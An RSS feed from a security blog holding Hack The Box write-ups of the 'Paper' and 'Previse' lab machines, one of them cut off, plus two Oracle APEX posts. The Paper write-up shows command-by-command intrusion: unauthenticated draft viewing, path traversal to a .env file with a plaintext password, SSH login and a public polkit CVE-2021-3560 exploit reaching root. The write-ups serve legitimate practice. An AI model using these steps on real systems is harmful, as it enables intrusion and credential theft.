<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Sat, 16 Jul 2022 15:27:47 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | Paper]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.com/home/machines/profile/432">here</a>.</em></p><hr><p>A quick initial scan discloses web services running on ports <code>80</code> and <code>443</code>, as well as an <code>SSH</code> server running on port <code>22</code>:</p><pre><code>~ nmap 10.10.11.143 -F -Pn

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open</code></pre>]]></description><link>inesmartins.github.io/htb-write-up-paper/</link><guid isPermaLink="false">62372fd922c479079cf78310</guid><category><![CDATA[wordpress]]></category><category><![CDATA[wp]]></category><category><![CDATA[wpscan]]></category><category><![CDATA[cve-2019-17671]]></category><category><![CDATA[rocketchat]]></category><category><![CDATA[cve-2021-3560]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 16 Jul 2022 15:19:29 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-20.20.03.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-20.20.03.png" alt="HTB Write-up | Paper"><p><em>Retired machine can be found <a href="https://www.hackthebox.com/home/machines/profile/432">here</a>.</em></p><hr><p>A quick initial scan discloses web services running on ports <code>80</code> and <code>443</code>, as well as an <code>SSH</code> server running on port <code>22</code>:</p><pre><code>~ nmap 10.10.11.143 -F -Pn

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https</code></pre><p>A closer look at these ports doesn&apos;t reveal anything too interesting, and both the secure and non-secure versions of the website show the same boilerplate content:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-14.13.51.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy"></figure><p>However, looking at the server response for this page, we can see an interesting header:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-14.02.15.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy"></figure><p>When we configure this virtual host locally, we see a blog for the &quot;Blunder Tiffin Paper Company&quot;:</p><pre><code>~ sudo nano /etc/hosts

...
10.10.11.143    office.paper</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-14.05.17.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="1440" height="716" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-20-at-14.05.17.png 600w, inesmartins.github.io/content/images/size/w1000/2022/03/Screenshot-2022-03-20-at-14.05.17.png 1000w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-14.05.17.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Going through the posts we can see some hints:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-18.52.10.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="755" height="570" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-20-at-18.52.10.png 600w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-18.52.10.png 755w" sizes="(min-width: 720px) 720px"></figure><p>So, ... <code>Prisonmike</code> is supposed to be the only user but <code>nick</code> commented that they should &quot;remove the secret content&quot; from the drafts ... interesting.</p><p>Running <code>nikto</code> we can see that this is a Wordpress blog:</p><pre><code>~ nikto -h http://office.paper/
...

+ Uncommon header &apos;link&apos; found, with contents: &lt;http://office.paper/index.php/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;
+ Uncommon header &apos;x-redirect-by&apos; found, with contents: WordPress</code></pre><p><code>wpscan</code> identified that the blog is using version <code>5.2.3</code> of Wordpress, which has many known vulnerabilities, however, one stands out, since it doesn&apos;t require valid credentials and it has to do with accessing user drafts:</p><pre><code>~ wpscan --url office.paper --api-token &lt;your-api-token&gt;

...
| [!] Title: WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts
...</code></pre><p>Using the trick described in <a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">this</a> blog post we find a draft post with some secrets:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.00.24.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="905" height="711" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-20-at-19.00.24.png 600w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.00.24.png 905w" sizes="(min-width: 720px) 720px"></figure><p>So, there&apos;s a &quot;Secret Registration URL of new Employee chat system&quot;, which is hosted at <code>chat.office.paper</code>, let&apos;s configure this virtual host:</p><pre><code>~ sudo nano /etc/hosts

...
10.10.11.143    office.paper
10.10.11.143    chat.office.paper</code></pre><p>Now, we can see the chat system and register a new account. <br>Turns out this application is an instance of RocketChat:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.03.53.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="1440" height="721" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-20-at-19.03.53.png 600w, inesmartins.github.io/content/images/size/w1000/2022/03/Screenshot-2022-03-20-at-19.03.53.png 1000w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.03.53.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>After scrolling to the top of the <code>#general</code> channel, we can see that there&apos;s a helpful bot called <code>recyclops</code> which, among other things, can fetch files in the local machine:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.04.36.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy"></figure><p>There&apos;s even a security-related warning:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.05.10.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy"></figure><p>Ok, let&apos;s see what this baby can do:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.16.12.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="455" height="362"></figure><p>Let&apos;s see if we can list other directories ...</p><pre><code>~ list ../

total 56
drwx------ 12 dwight dwight 4096 Mar 20 10:52 .
drwxr-xr-x. 3 root root 20 Mar 20 10:54 ..
-rw------- 1 dwight dwight 1486 Mar 20 11:21 .bash_history
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
drwx------ 2 dwight dwight 6 Mar 18 12:47 .cache
drwx------ 5 dwight dwight 56 Jul 3 2021 .config
-rw------- 1 dwight dwight 18 Mar 19 02:39 .dbshell
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
drwx------ 3 dwight dwight 69 Mar 19 02:39 .gnupg
drwx------ 8 dwight dwight 4096 Mar 19 10:11 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
drwx------ 3 dwight dwight 19 Jul 3 2021 .local
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
-rw------- 1 dwight dwight 7 Mar 18 12:56 .python_history
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
-r-------- 1 dwight dwight 33 Mar 18 01:54 user.txt
drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
-rw------- 1 dwight dwight 2657 Mar 20 08:31 .viminfo</code></pre><p>The <code>hubot</code> directory looks interesting, particularly because it has a <code>.env</code> file, which usually stores credentials:</p><pre><code>list ../hubot
...
-rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env</code></pre><p>Yes, we have some creds!</p><pre><code>~ file ../hubot/.env

export ROCKETCHAT_URL=&apos;http://127.0.0.1:48320&apos;
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1</code></pre><p>And we can use them to <code>SSH</code> into the machine as <code>dwight</code>!</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.39.35.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy"></figure><p><code>linpeas.sh</code> is pretty good at identifying privilege escalation issues, so let&apos;s start by sending the script to the machine&apos;s <code>/tmp</code> file:</p><pre><code>~ scp linpeas.sh dwight@10.10.11.143:/tmp
~ ssh dwight@10.10.11.143

[dwight@paper ~]$ cd /tmp/
[dwight@paper tmp]$ chmod +x linpeas.sh
[dwight@paper tmp]$ ./linpeas.sh</code></pre><p>When we run this script we immediately get a warning that the machine is vulnerable to <code>CVE-2021-3560</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-20.00.19.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="978" height="277" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-20-at-20.00.19.png 600w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-20.00.19.png 978w"></figure><p>OK, let&apos;s grab <a href="https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py">a poc</a> and send it to the <code>/tmp</code> dir:</p><pre><code>~ scp -r CVE-2021-3560.py dwight@10.10.11.143:/tmp/CVE-2021-3560.py
~ ssh dwight@10.10.11.143

[dwight@paper ~]$ python3 CVE-2021-3560.py

[root@paper dwight]# cd /root
[root@paper ~]# cat root.txt
580aba1066f998cbf4a03deb6f758717</code></pre><p>Just like that, we&apos;re done!</p><hr>]]></content:encoded></item><item><title><![CDATA[Creating a very spammable endpoint with Oracle APEX Restful Services]]></title><description><![CDATA[<p>I&apos;m helping an organisation that has a very simple (and very static) corporate website. They were interested in adding a contact form, and wanted the data to be sent to their APEX-managed database.</p><p>Building an entire back-end service for this purpose seemed like too much work, &#xA0;so</p>]]></description><link>inesmartins.github.io/creating-a-very-spammable-endpoint-with-apex-restful-services/</link><guid isPermaLink="false">627664568b67d59413e27ad7</guid><category><![CDATA[oracle apex]]></category><category><![CDATA[apex]]></category><category><![CDATA[spam]]></category><category><![CDATA[endpoint security]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 07 May 2022 15:35:26 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2022/05/email-spam.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2022/05/email-spam.jpeg" alt="Creating a very spammable endpoint with Oracle APEX Restful Services"><p>I&apos;m helping an organisation that has a very simple (and very static) corporate website. They were interested in adding a contact form, and wanted the data to be sent to their APEX-managed database.</p><p>Building an entire back-end service for this purpose seemed like too much work, &#xA0;so I decided to give APEX&apos;s <a href="https://docs.oracle.com/database/apex-18.1/AEUTL/using-RESTful-services.htm#AEUTL445">RESTful Services</a> a try:</p><p><em>	RESTful Services enable the creation of a set of standards-based API&#x2019;s on top of database objects available for a workspace. Without connecting directly to the underlying data source these API&#x2019;s allow external systems to interact securely with the data by querying, inserting, updating or deleting.</em></p><p>I started by creating a new <code>CONTACT_REQUEST</code> table:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-14.34.03.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1978" height="744" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-14.34.03.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-14.34.03.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-14.34.03.png 1600w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-14.34.03.png 1978w" sizes="(min-width: 1200px) 1200px"></figure><p>Then, on the &quot;Restful Data Services&quot; page (under <code>SQL Workshop</code>), I created a new ORDS (Oracle REST Data Services) <a href="https://docs.oracle.com/database/apex-5.1/AEUTL/how-to-create-RESTful-service-module-example.htm#AEUTL29134">Module</a> called <code>forms</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-17.02.24.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1616" height="772" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-17.02.24.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-17.02.24.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-17.02.24.png 1600w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-17.02.24.png 1616w" sizes="(min-width: 720px) 720px"></figure><p>Note that I&apos;ve added the website&apos;s domain to the &quot;<a href="https://oracle-base.com/articles/misc/oracle-rest-data-services-ords-allowed-origins">Origins Allowed</a>&quot; field to allow the website to access the response from this cross-origin request.</p><p>Under this new module, I created a <strong>Template</strong> called <code>contact</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-16.42.22.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="2000" height="747" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-16.42.22.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-16.42.22.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-16.42.22.png 1600w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-16.42.22.png 2068w" sizes="(min-width: 720px) 720px"></figure><p>Finally, I created a <strong>Handler</strong> for this template:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-14.19.13.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1734" height="772" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-14.19.13.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-14.19.13.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-14.19.13.png 1600w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-14.19.13.png 1734w" sizes="(min-width: 720px) 720px"></figure><p>The most important part of the handler configuration is the <code>PL/SQL</code> block. I used the script shown below to insert the data received in the request into the <code>CONTACT_REQUEST</code> table, and define a <code>status</code> variable with value <code>201</code>, which is the success status code:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.27.12.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1326" height="438" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-15.27.12.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-15.27.12.png 1000w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.27.12.png 1326w" sizes="(min-width: 720px) 720px"></figure><p>In order for the status code to be returned, I also needed to add the <code>X-APEX-STATUS-CODE</code> header configuration at the bottom of the page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.28.40.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="2000" height="313" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-15.28.40.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-15.28.40.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-15.28.40.png 1600w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.28.40.png 2070w" sizes="(min-width: 1200px) 1200px"></figure><p>In just a couple of minutes, I had my new endpoint:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-16.44.00.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1492" height="758" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-16.44.00.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-16.44.00.png 1000w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-16.44.00.png 1492w" sizes="(min-width: 720px) 720px"></figure><p>And as you can see the data is added to the new database, as expected:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.32.56.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="2000" height="424" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-15.32.56.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-15.32.56.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-15.32.56.png 1600w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.32.56.png 2068w" sizes="(min-width: 1200px) 1200px"></figure><h2 id="this-looks-very-spammable">This looks very spammable</h2><p>It is.</p><p>From what I could find, <strong>APEX doesn&apos;t support rate limiting</strong>, so there&apos;s not much else I can do to prevent someone from finding this endpoint and spamming it for fun.</p><p>Since the client is communicating directly with APEX, I can&apos;t think of any alternative way to throttle requests.</p><p>Finally, if you&apos;ve been paying attention I&apos;ve been obscuring the sub-directory that APEX assigned for my organisation, which was based on the &quot;schema&quot; that I set at the start of this process.</p><p>This means that a simple Google Dork may allow you to <strong>enumerate all endpoints of this type</strong>, and most likely find many that don&apos;t enforce authorisation, either on purpose (which is the case here), or by mistake.</p><p>In fact, the <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/oracle.txt">oracle.txt SecList</a> already has some popular name-patterns.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-17.23.05.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1506" height="1332" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-17.23.05.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-17.23.05.png 1000w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-17.23.05.png 1506w" sizes="(min-width: 720px) 720px"></figure><p>Have fun &#x1F609;</p>]]></content:encoded></item><item><title><![CDATA[How to import mySQL data into Oracle APEX (the hard way)]]></title><description><![CDATA[<blockquote>Oracle Application Express (APEX) is a low-code development platform that enables you to build scalable, secure enterprise apps, with world-class features, that can be deployed anywhere.</blockquote><p>Recently I was asked to import a <code>mySQL</code> database into <a href="https://apex.oracle.com/en/">APEX</a>. </p><p>Although support for <code>mySQL</code> databases is on <a href="https://apex.oracle.com/en/learn/resources/roadmap/">the roadmap</a>, it seems like for</p>]]></description><link>inesmartins.github.io/how-to-import-mysql-data-into-orable-apex/</link><guid isPermaLink="false">62345300d262e33a24f282d8</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 18 Mar 2022 10:16:10 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2022/05/channels4_profile.jpeg" medium="image"/><content:encoded><![CDATA[<blockquote>Oracle Application Express (APEX) is a low-code development platform that enables you to build scalable, secure enterprise apps, with world-class features, that can be deployed anywhere.</blockquote><img src="inesmartins.github.io/content/images/2022/05/channels4_profile.jpeg" alt="How to import mySQL data into Oracle APEX (the hard way)"><p>Recently I was asked to import a <code>mySQL</code> database into <a href="https://apex.oracle.com/en/">APEX</a>. </p><p>Although support for <code>mySQL</code> databases is on <a href="https://apex.oracle.com/en/learn/resources/roadmap/">the roadmap</a>, it seems like for now there&apos;s no straightforward way to import this data ... so here&apos;s a tutorial on how to do it the <em>hard way</em>.</p><p>Under &quot;SQL Workshop&quot; &gt; &quot;Utilities&quot; &gt; &quot;Data Workshop&quot; you can see that there&apos;s a feature that allows you to load data in multiple formats, including <code>csv</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-18-at-09.48.45.png" class="kg-image" alt="How to import mySQL data into Oracle APEX (the hard way)" loading="lazy"></figure><p>So, I decided to create a Python script to grab the data from each of the tables in the <code>mySQL</code> database and export it as an individual <code>csv</code> file:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/ba54cdd6eadb608ec10744535e1dde77.js"></script><!--kg-card-end: html--><p> In order to run this script, make sure to install <a href="https://pypi.org/project/mysql-connector-python/">mysql-connector-python</a>:</p><pre><code class="language-prettyprint lang-sh">~ python3 -m pip install mysql-connector-python</code></pre><p>Then, you can simply run:</p><pre><code class="language-prettyprint lang-sh">~ python3 mysql-to-csv.py</code></pre><p>By the end, you should have a directory full of <code>csv</code> files which you can import, as such:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-18-at-09.56.57-1.png" class="kg-image" alt="How to import mySQL data into Oracle APEX (the hard way)" loading="lazy"></figure><p>Note that you can only load one file at a time, and you also need to manually add the table&apos;s name.</p><p>Once you&apos;re done with importing the data you can go to &quot;SQL Workshop&quot; &gt; &quot;Object Browser&quot; and see all of your tables, which you can then modify as needed:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-18-at-09.59.39-1.png" class="kg-image" alt="How to import mySQL data into Oracle APEX (the hard way)" loading="lazy" width="1440" height="689" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-18-at-09.59.39-1.png 600w, inesmartins.github.io/content/images/size/w1000/2022/03/Screenshot-2022-03-18-at-09.59.39-1.png 1000w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-18-at-09.59.39-1.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Unfortunately, using this method you also need to <strong>add all of the constraints</strong> by hand.</p><p>I&apos;m sure there is a better way to do this, but in the meanwhile here&apos;s a bad workaround, hope it helps!</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Previse]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.com/home/machines/profile/373">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>As always, we start by mapping the <code>previse.htb</code> hostname to the given IP: </p><pre><code class="language-prettyprint lang-sh">~ sudo nano /etc/hosts

10.10.11.104  previse.htb</code></pre><p>The <code>nmap</code> scan is pretty boring, it seems there&apos;s a web server running on port <code>80</code> and</p>]]></description><link>inesmartins.github.io/htb-write-up-previse/</link><guid isPermaLink="false">61d17eafa85f99e081fdd052</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 21 Jan 2022 11:04:08 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-05-at-15.03.17.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.com/home/machines/profile/373">here</a>.</blockquote><h2 id="scanning">Scanning</h2><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-05-at-15.03.17.png" alt="HTB Write-up | Previse"><p>As always, we start by mapping the <code>previse.htb</code> hostname to the given IP: </p><pre><code class="language-prettyprint lang-sh">~ sudo nano /etc/hosts

10.10.11.104  previse.htb</code></pre><p>The <code>nmap</code> scan is pretty boring, it seems there&apos;s a web server running on port <code>80</code> and an SSH server on port <code>22</code>:</p><pre><code class="language-prettyprint lang-sh">~ nmap 10.10.11.104

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

~  nmap 10.10.11.104 -sC -sV -A -p 22,80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Previse Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2 id="enumeration">Enumeration</h2><p>When we access <a href="http://previse.htb">previse.htb</a> we&apos;re redirected to the login page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-10.32.16.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><p>Let&apos;s try to enumerate some directories and files with <code>gobuster</code>:</p><pre><code class="language-prettyprint lang-sh">~ gobuster dir \
-u http://previse.htb \
-c PHPSESSID=r989gcoqshohp5v8thvcji2sh2 \
-x php \
-w ../seclists/big.txt \   
-s 200 -b 403,404 --wildcard

[...]

/accounts.php         (Status: 302) [Size: 3994] [--&gt; login.php]
/config.php           (Status: 200) [Size: 0]                   
/css                  (Status: 301) [Size: 308] [--&gt; http://previse.htb/css/]
/download.php         (Status: 302) [Size: 0] [--&gt; login.php]                
/favicon.ico          (Status: 200) [Size: 15406]                            
/files.php            (Status: 302) [Size: 8377] [--&gt; login.php]             
/footer.php           (Status: 200) [Size: 217]                              
/header.php           (Status: 200) [Size: 980]                              
/index.php            (Status: 302) [Size: 2801] [--&gt; login.php]             
/js                   (Status: 301) [Size: 307] [--&gt; http://previse.htb/js/] 
/login.php            (Status: 200) [Size: 2224]                             
/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]                
/logs.php             (Status: 302) [Size: 0] [--&gt; login.php]
/nav.php              (Status: 200) [Size: 1248]
/status.php           (Status: 302) [Size: 2970] [--&gt; login.php] </code></pre><p>All of the pages either redirect to <code>login.php</code> or have no interesting content, except for the <code>nav.php</code> which has some interesting links:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-10.39.37.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><p>The links are:</p><ul><li>Home: <code>/index.php</code></li><li>Accounts + Create Account: <code>/accounts.php</code></li><li>Files: <code>/files.php</code></li><li>Management Menu + Website Status: <code>/status.php</code></li><li>Log data: <code>/file_logs.php</code></li></ul><p>... but they all redirect to <code>login.php</code> since we&apos;re not authenticated.</p><h2 id="bypassing-authentication">Bypassing Authentication</h2><p>The <code>accounts.php</code> page seems the most interesting, maybe we can try some other HTTP methods:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.24.01.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><p>Using this <code>POST</code> request we can create a new user and then use these creds to log in:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.24.38.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="1440" height="427" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.24.38.png 600w, inesmartins.github.io/content/images/size/w1000/2022/01/Screenshot-2022-01-02-at-11.24.38.png 1000w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.24.38.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><h2 id="exploring-the-website">Exploring the website</h2><p>On the <code>files.php</code> page there are clearly some attempts to upload reverse shells, as well as a <code>zip</code> file that contains the site backup:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.25.33.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="1440" height="686" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.25.33.png 600w, inesmartins.github.io/content/images/size/w1000/2022/01/Screenshot-2022-01-02-at-11.25.33.png 1000w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.25.33.png 1440w" 